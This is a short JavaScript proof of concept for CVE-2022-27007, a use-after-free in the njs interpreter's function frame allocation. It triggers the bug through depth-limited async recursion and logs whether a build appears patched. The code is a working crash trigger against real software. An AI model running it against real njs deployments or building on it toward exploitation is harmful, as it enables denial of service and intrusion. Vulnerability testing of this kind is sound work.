// CVE-2022-27007 Refined Proof of Concept
// Use-after-free in njs_function_frame_alloc() - Limited execution time
//
// This PoC triggers the vulnerability but limits recursion depth to finish quickly

let depth = 0;
const MAX_DEPTH = 50; // Limit recursion to prevent long execution

async function triggerFrameBug() {
    // Increment depth counter
    depth++;
    
    // Stop recursion after reasonable depth to limit execution time
    if (depth > MAX_DEPTH) {
        console.log(`Reached max depth ${MAX_DEPTH} - test completed`);
        console.log("If this runs without crash, the CVE is likely patched");
        return "completed";
    }
    
    // Create local variables to ensure frame has spare memory
    let localVar1 = `data_${depth}_1`;
    let localVar2 = `data_${depth}_2`; 
    let localVar3 = `data_${depth}_3`;
    
    // Log progress every 10 iterations
    if (depth % 10 === 0) {
        console.log(`Depth: ${depth}`);
    }
    
    // This await triggers njs_function_frame_save()
    // Vulnerable: saves frame with dangling spare memory pointers
    // Fixed: clears spare memory fields (native->free = NULL)
    await Promise.resolve(`save_frame_${depth}`);
    
    // Recursive call triggers njs_function_frame_alloc()
    // Vulnerable: tries to reuse freed spare memory -> UAF crash
    // Fixed: allocates new memory safely
    return await triggerFrameBug();
}

console.log("Starting CVE-2022-27007 test...");
console.log("Vulnerable njs 0.7.2: Should crash with heap-use-after-free");
console.log("Patched njs: Should complete normally");

const startTime = Date.now();

triggerFrameBug()
.then(result => {
    const endTime = Date.now();
    console.log(`Test completed successfully in ${endTime - startTime}ms`);
    console.log("Result:", result);
    console.log("CVE appears to be PATCHED - no crash occurred");
})
.catch(e => {
    const endTime = Date.now();
    console.log(`Test failed after ${endTime - startTime}ms`);
    console.log("Error:", e.message);
    console.log("This could indicate the CVE is present or other issues");
});

